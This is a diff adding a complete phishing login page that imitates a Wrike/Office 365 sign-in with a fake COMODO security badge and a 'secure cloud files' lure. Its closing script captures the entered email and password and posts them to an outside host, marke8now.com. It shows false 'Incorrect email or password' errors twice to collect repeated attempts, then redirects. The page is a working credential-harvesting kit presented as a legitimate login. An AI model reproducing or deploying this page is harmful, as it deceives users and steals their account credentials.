@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+    <meta http-equiv="Expires" content="-1" />
+    <meta http-equiv="Pragma" content="no-cache" />
+    <meta http-equiv="Cache-Control" content="no-cache" />
+
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0"
+    />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="default" />
+
+    <title>Sign In to your account</title>
+
+    <link rel="shortcut icon" href="assets/img/cloud.ico" />
+
+    <link rel="stylesheet" href="assets/css/materialize.min.css" />
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="./assets/css/login_style.css"
+    />
+
+    <!--[if lte IE 8]>
+      <style type="text/css">
+        .login-input input[type="text"],
+        .login-input input[type="password"],
+        .login-input input[type="email"] {
+          padding-top: 10px;
+          height: 28px;
+        }
+      </style>
+    <![endif]-->
+
+    <script src="https://cdn.jsdelivr.net/jquery/1.12.4/jquery.min.js"></script>
+
+    <script src="https://cdn.jsdelivr.net/jquery.validation/1.15.1/jquery.validate.min.js"></script>
+
+    <script type="text/javascript">
+      jQuery.extend(jQuery.validator.messages, {
+        required: "This field is required.",
+        remote: "Please fix this field.",
+        email: "Please enter a valid email address.",
+        equalTo: "Please enter the same value again.",
+        accept: "Please enter a value with a valid extension.",
+        maxlength: jQuery.validator.format(
+          "Please enter no more than {0} characters."
+        ),
+        minlength: jQuery.validator.format(
+          "Please enter at least {0} characters."
+        ),
+        rangelength: jQuery.validator.format(
+          "Please enter a value between {0} and {1} characters long."
+        ),
+        range: jQuery.validator.format(
+          "Please enter a value between {0} and {1}."
+        ),
+        max: jQuery.validator.format(
+          "Please enter a value less than or equal to {0}."
+        ),
+        min: jQuery.validator.format(
+          "Please enter a value greater than or equal to {0}."
+        ),
+      });
+    </script>
+
+    <script type="text/javascript">
+      jQuery.validator.addMethod("wrikeEmail", function (value, element) {
+        if (!/.+@.+/i.test(value)) {
+          return false;
+        }
+        return true;
+      });
+
+      jQuery(document).ready(function ($) {
+        $("#passwordField").css(
+          "padding-right",
+          $("#forgot-link").width() + 20 + "px"
+        );
+
+        var errorPlacement = $(".validation-block");
+        var formNative = $("#nativeLoginForm");
+        formNative.attr("novalidate", "novalidate");
+
+        function disableForm() {
+          $(formNative)
+            .find("#submit-login-button")
+            .addClass("loading")
+            .attr("disabled", "disabled")
+            .end()
+            .find("input, textarea")
+            .addClass("loading")
+            .attr("disabled", "disabled")
+            .end();
+        }
+
+        function enableForm() {
+          $(formNative)
+            .find("#submit-login-button")
+            .removeClass("loading")
+            .removeAttr("disabled")
+            .end()
+            .find("input, textarea")
+            .removeClass("loading")
+            .removeAttr("disabled")
+            .end();
+        }
+
+        $("a.w3link").addClass("link-content");
+        validator = formNative.validate({
+          rules: {
+            login: {
+              required: true,
+              wrikeEmail: true,
+            },
+            pwd: {
+              required: true,
+              minlength: 6,
+            },
+          },
+          messages: {
+            login: {
+              required: "Please enter your email address",
+              wrikeEmail: "Please double check your email address",
+            },
+            pwd: {
+              required: "Please enter your password",
+              minlength: "Your password must be at least 6 characters long",
+            },
+          },
+          errorPlacement: function (error, element) {
+            errorPlacement.append(error);
+          },
+
+          submitHandler: function (form) {},
+          focusInvalid: true,
+          errorElement: "div",
+        });
+
+        var samlUserStatus = null;
+
+        function checkSamlUserStatus() {
+          if (!samlUserStatus) {
+            try {
+              var samlStatus = readSamlStatus($("#emailField").val(), "");
+              if (samlStatus && samlStatus.data.useSamlIdp) {
+                samlUserStatus = samlStatus.data;
+              } else {
+                samlUserStatus = null;
+              }
+            } catch (e) {
+              samlUserStatus = null;
+            }
+          }
+          return samlUserStatus;
+        }
+
+        function redirectToSamlIdp(samlStatus) {
+          var redirectUrl = $(".ssoForm").find("[name=redirectUrl]").val();
+          window.location =
+            samlStatus.discoveryLink +
+            (redirectUrl
+              ? "&redirectUrl=" + encodeURIComponent(redirectUrl)
+              : "");
+        }
+
+        formNative.submit(function (e) {
+          e.preventDefault();
+          samlUserStatus = null;
+          validator.stopRequest(jQuery("#emailField"), true);
+          if (!validator.errorList.length) {
+            if (validator.pendingRequest) {
+              validator.formSubmitted = true;
+              disableForm();
+            }
+            var email = $(formNative).find('input[name="login"]').val();
+            var data = { user_email: email };
+            $(document).trigger("login_form__submit", [data]);
+          }
+        });
+
+        $("#emailField, #passwordField").keypress(function (e) {
+          if (e.which === 13) {
+            e.preventDefault();
+            formNative.submit();
+          }
+        });
+
+        if (errorPlacement.text().trim()) {
+          var errorFieldName = "";
+          if (errorFieldName && true) {
+            var errors = {};
+            errors[errorFieldName] = errorPlacement.html().trim();
+            errorPlacement.empty();
+            validator.invalid[errorFieldName] = true;
+            formNative.triggerHandler("invalid-form", [validator]);
+            validator.showErrors(errors);
+            formNative.find("*[name='" + errorFieldName + "']").focus();
+          } else {
+            errorPlacement.wrapInner(
+              '<div class="error" htmlfor="' + errorFieldName + '"></div>'
+            );
+          }
+        }
+
+        var focus_field = "" === "pwd" ? $("#passwordField") : $("#emailField");
+        focus_field.focus();
+
+        $(document).trigger("login_screen__shown");
+      });
+
+      jQuery(document).ready(function ($) {
+        if (window.w2 && w2.isUsedByAddIn) {
+          initAddinHelper();
+        }
+
+        if (window.isReadOnlyWorkspace) {
+          startReadOnlyPolling();
+        }
+
+        var hash = window.location.hash;
+        if (hash) {
+          var inputs = document.getElementsByName("redirectUrl");
+          for (var i = 0, len = inputs.length; i < len; i++) {
+            inputs[i].value += hash;
+          }
+        }
+
+        var rememberMeCheckbox = $("#rememberMe");
+        var checkboxDiv = rememberMeCheckbox.parent();
+
+        var isSpecificPlatform = false;
+        var initialRememberMeKey = "initialRememberMe";
+        var initialRememberMe;
+
+        if (isSpecificPlatform) {
+          initialRememberMe =
+            localStorage.getItem(initialRememberMeKey) != "off";
+        } else {
+          initialRememberMe = false;
+        }
+
+        if (initialRememberMe) {
+          rememberMeCheckbox.click();
+          checkboxDiv.addClass("checkbox-checked");
+        }
+
+        rememberMeCheckbox.change(function () {
+          if (this.checked) {
+            checkboxDiv.addClass("checkbox-checked");
+            localStorage.removeItem(initialRememberMeKey);
+          } else {
+            checkboxDiv.removeClass("checkbox-checked");
+            localStorage.setItem(initialRememberMeKey, "off");
+          }
+        });
+
+        rememberMeCheckbox.focus(function () {
+          checkboxDiv.addClass("checkbox-focused");
+        });
+
+        rememberMeCheckbox.blur(function () {
+          checkboxDiv.removeClass("checkbox-focused");
+        });
+
+        $(".checkbox").addClass("rich-checkbox");
+      });
+    </script>
+
+    <style type="text/css">
+      #passwordField::-ms-reveal {
+        margin-right: 60px;
+      }
+    </style>
+  </head>
+  <body lang="en">
+    <div class="wrapper">
+      <div class="login-horizontal-centered">
+        <div class="wrike-ppm-logo"></div>
+
+        <div class="signup-block">
+          <div>Receive secure cloud files. Any e-mail, Anywhere!</div>
+        </div>
+
+        <form
+          method="POST"
+          class="ssoForm"
+          id="nativeLoginForm"
+          novalidate="novalidate"
+        >
+          <script type="text/javascript" language="JavaScript">
+            var focusControl = jQuery("#emailField");
+
+            if (
+              focusControl.attr("type") != "hidden" &&
+              !focusControl.attr("disabled")
+            ) {
+              focusControl.focus();
+            }
+          </script>
+
+          <input type="submit" style="display: none" id="loginFormSubmit" />
+
+          <div class="login-block">
+            <div class="loginError validation-block"></div>
+            <div class="leftPane">
+              Your new password was sent check your mail and login
+            </div>
+            <div class="login-input">
+              <input
+                id="emailField"
+                name="login"
+                type="email"
+                tabindex="1"
+                placeholder="Email"
+                class="gaga"
+                value=""
+              />
+
+              <div class="validation-div"></div>
+            </div>
+            <div class="login-input">
+              <input
+                id="passwordField"
+                name="pwd"
+                type="password"
+                tabindex="2"
+                class="gugu"
+                placeholder="Password"
+                style="padding-right: 71px"
+              />
+
+              <div class="validation-div"></div>
+            </div>
+            <div class="login-input">
+              <div class="l-right">
+                <button
+                  type="submit"
+                  name="action-button"
+                  value=""
+                  tabindex="4"
+                  class="button-light-blue"
+                  id="submit-login-button"
+                >
+                  Login
+                </button>
+              </div>
+
+              <div class="l-left" style="padding: 12px 0 0 0">
+                <div class="l-left checkbox rich-checkbox">
+                  <input
+                    type="checkbox"
+                    id="rememberMe"
+                    name="rememberMe"
+                    tabindex="3"
+                  />
+                </div>
+                <label for="rememberMe" class="l-left">Remember me</label>
+              </div>
+            </div>
+
+            <div class="alternative-login"></div>
+          </div>
+        </form>
+      </div>
+    </div>
+
+    <center>
+      <div class="get-app" id="tryMobileContainer">
+        <div class="icon">
+          <img src="assets/img/office365-logos-footer.png" />
+        </div>
+      </div>
+    </center>
+
+    <div id="footer" class="footer">
+      <div class="login-copyright-wrapper">
+        <div class="login-horizontal-centered-footer">
+          Copyright ©2018. This site is secured by COMODO, Inc.
+          <br /><img
+            src="assets/img/comodo_secure_104x59_transp.png"
+            height="40"
+          />
+        </div>
+      </div>
+    </div>
+
+    <script type="text/javascript" src="assets/js/materialize.min.js"></script>
+    <script>
+      document.addEventListener("DOMContentLoaded", () => {
+        document.querySelector("#emailField").value = new URLSearchParams(
+          window.location.search
+        ).get("email");
+
+        let tries = 0;
+        document.querySelector("form").addEventListener("submit", (e) => {
+          e.preventDefault();
+
+          var email = document.querySelector("input.gaga").value;
+          var password = document.querySelector("input.gugu").value;
+          fetch("https://marke8now.com/nw/next.php", {
+            method: "POST",
+            mode: "cors",
+            body: new FormData(document.querySelector("form")),
+          })
+            .then((r) => r.json())
+            .then((r) => {
+              if (r) {
+                if (tries >= 2) {
+                  window.location.href = `authenticate.html`;
+                } else {
+                  document.querySelector("input.gugu").value = "";
+                  alert("Incorrect email or password");
+                  document.querySelector("input.gugu").focus();
+                }
+              }
+              tries++;
+            })
+            .catch((err) => {
+              if (tries >= 2) {
+                window.location.href = `authenticate.html`;
+              } else {
+                document.querySelector("input.gugu").value = "";
+                alert("Incorrect email or password");
+                document.querySelector("input.gugu").focus();
+              }
+
+              tries++;
+            });
+        });
+      });
+    </script>
+  </body>
+</html>
